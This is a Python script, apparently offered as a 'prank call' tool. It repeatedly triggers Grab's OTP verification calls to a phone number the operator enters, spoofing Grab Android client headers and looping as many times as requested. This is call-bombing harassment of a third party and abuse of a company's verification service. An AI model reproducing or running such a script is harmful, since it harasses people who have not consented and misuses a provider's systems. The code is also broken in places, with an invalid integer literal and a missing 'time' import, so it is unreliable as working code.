import random
import requests
import json

def get():
    return input().strip()

class prankCall:
    def __init__(self, no):
        self.number = no

    def correct(self, no):
        cek = no[:2]
        if cek == "08":
            no = "62" + no[1:]
        return no

    def ekse(self):
        no = self.correct(self.number)
        rand = random.randint(0123456, 9999999)
        rands = self.randStr(12)
        post = f"method=CALL&countryCode=id&phoneNumber={no}&templateID=pax_android_production"
        headers = {
            "x-request-id": f"ebf61bc3-8092-4924-bf45-{rands}",
            "Accept-Language": "in-ID;q=1.0, en-us;q=0.9, en;q=0.8",
            "User-Agent": f"Grab/5.20.0 (Android 6.0.1; Build {rand})",
            "Content-Type": "application/x-www-form-urlencoded",
            "Content-Length": str(len(post)),
            "Host": "api.grab.com",
            "Connection": "close"
        }
        response = requests.post("https://api.grab.com/grabid/v1/phone/otp", data=post, headers=headers)
        result = response.json()
        if "challengeID" not in result or not result["challengeID"]:
            print("Gagal")
        else:
            print("Sukses")

    def loop(self, many, sleep=None):
        a = 0
        no = self.correct(self.number)
        while a < many:
            rand = random.randint(0123456, 9999999)
            rands = self.randStr(12)
            post = f"method=CALL&countryCode=id&phoneNumber={no}&templateID=pax_android_production"
            headers = {
                "x-request-id": f"ebf61bc3-8092-4924-bf45-{rands}",
                "Accept-Language": "in-ID;q=1.0, en-us;q=0.9, en;q=0.8",
                "User-Agent": f"Grab/5.20.0 (Android 6.0.1; Build {rand})",
                "Content-Type": "application/x-www-form-urlencoded",
                "Content-Length": str(len(post)),
                "Host": "api.grab.com",
                "Connection": "close"
            }
            response = requests.post("https://api.grab.com/grabid/v1/phone/otp", data=post, headers=headers)
            result = response.json()
            if "challengeID" not in result or not result["challengeID"]:
                continue
            else:
                nn = a + 1
                print(f"[{nn}] Sukses\r", end="")
                a += 1
            if sleep is not None:
                time.sleep(sleep)
            if a >= many:
                print("\nCompleted!")

    def randStr(self, l):
        data = "abcdefghijklmnopqrstuvwxyz1234567890"
        word = ""
        for _ in range(l):
            word += random.choice(data)
        return word

    def run(self):
        while True:
            print("?Loop(y/n)\t", end="")
            loop = get()
            if loop in ["y", "n"]:
                break
            else:
                print("Jika ya jawab y jika tidak jawab n")
                continue
        if loop == "y":
            print("?Many\t\t", end="")
            many = int(get())
            self.loop(many)
        else:
            self.ekse()

print("#################################")
print("# Copyright : @Zaakir | SCS-Team #")
print("#################################")
print("?Number\t\t", end="")
no = get()
n = prankCall(no)
n.run()
